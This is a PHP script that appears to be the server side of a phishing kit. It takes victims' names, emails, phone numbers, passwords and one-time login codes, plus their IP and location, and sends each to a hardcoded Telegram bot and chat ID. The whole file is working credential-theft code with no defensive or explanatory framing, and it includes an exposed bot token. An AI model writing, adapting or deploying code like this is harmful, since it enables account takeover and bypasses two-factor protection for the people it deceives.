<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	
	function sendTelegramMessage($token, $chatId, $message) {
    $telegramUrl = "https://api.telegram.org/bot$token/sendMessage";
    $telegramParams = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $telegramResponse = curl_exec($ch);
    curl_close($ch);

    return $telegramResponse;
	}
	
    $telegramToken = '7256521173:AAHWNCkmaSHqoyeXAIomGZ2SPMlcbLbg5wY';
    $telegramChatId = '5607989288';

    $info = $_POST['info'];
    $fullName = $_POST['fullName'];
    $businessEmail = $_POST['businessEmail'];
    $personalEmail = $_POST['personalEmail'];
    $mobilePhone = $_POST['mobilePhone'];
    $pageName = $_POST['pageName'];
    $code = $_POST['password'];
    $otp = $_POST['otp'];
	
    $ip = $_POST['ip'] ?? null;
    $city = $_POST['city'] ?? null;
    $region = $_POST['region'] ?? null;
    $country = $_POST['country_name'] ?? null;
    $veref = $_POST['veref'] ?? null;

if (!empty($city)) {
	
	$telegramMessage = "ip:$ip\nCity: $city\nRegion: $region\nCountry-name: $country\n================\nInfo: $info\nFull Name: $fullName\nBusiness Email: $businessEmail\nPersonal Email: $personalEmail\nMobile Phone: $mobilePhone\nPage Name: $pageName\n\n";
	
	sendTelegramMessage($telegramToken, $telegramChatId, $telegramMessage);
	
}

if (!empty($code)) {
	
	$telegramMessage = "ip:$ip\nPassword: $code\n\n";
	
	sendTelegramMessage($telegramToken, $telegramChatId, $telegramMessage);
	
}

if (!empty($otp)) {
	
	$telegramMessage = "IP: $ip\nLogin code: $otp\n\n"; // Сообщение для отправки
	sendTelegramMessage($telegramToken, $telegramChatId, $telegramMessage);
	
}

} else {
    echo 'Invalid request method!';
}
?>





